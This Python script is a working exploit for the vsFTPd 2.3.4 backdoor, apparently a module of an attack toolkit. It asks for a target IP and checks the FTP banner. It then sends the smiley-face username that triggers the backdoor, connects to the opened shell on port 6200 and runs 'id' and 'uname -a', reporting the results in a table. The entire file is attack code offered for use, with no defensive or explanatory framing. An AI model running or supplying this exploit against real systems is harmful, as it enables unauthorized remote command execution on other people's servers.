import socket
from colorama import Fore
from prettytable import PrettyTable

def run():
    def check_vulnerability(ip):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                s.connect((ip, 21))
                banner = s.recv(1024).decode()
                
                if 'vsFTPd 2.3.4' in banner:
                    s.sendall(b"USER anonymous:)\n")
                    s.sendall(b"PASS test\n")
                    return True
                return False
        except Exception as e:
            print(Fore.RED + f"[!] Connection Error: {str(e)}")
            return False

    def exploit_backdoor(ip):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(10)
                s.connect((ip, 6200))
                s.sendall(b"id\nuname -a\n")
                return s.recv(1024).decode()
        except:
            return None

    ip = input("\n[+] Enter Target IP: ").strip()
    
    print(Fore.YELLOW + f"\n[~] Checking {ip}...")
    
    if not check_vulnerability(ip):
        print(Fore.RED + "[!] Target not vulnerable or FTP service not available")
        return
    
    print(Fore.GREEN + "[+] Vulnerable target detected!")
    print(Fore.YELLOW + "[~] Attempting backdoor connection...")
    
    result = exploit_backdoor(ip)
    
    table = PrettyTable()
    table.field_names = [f"{Fore.CYAN}IP", f"{Fore.GREEN}Status", f"{Fore.YELLOW}Output"]
    table.align = "l"
    
    if result:
        table.add_row([ip, Fore.GREEN + "Exploited", result[:100] + "..."])
    else:
        table.add_row([ip, Fore.RED + "Failed", "Backdoor not accessible"])
    
    print(Fore.MAGENTA + "\n=== Exploit Results ===")
    print(table)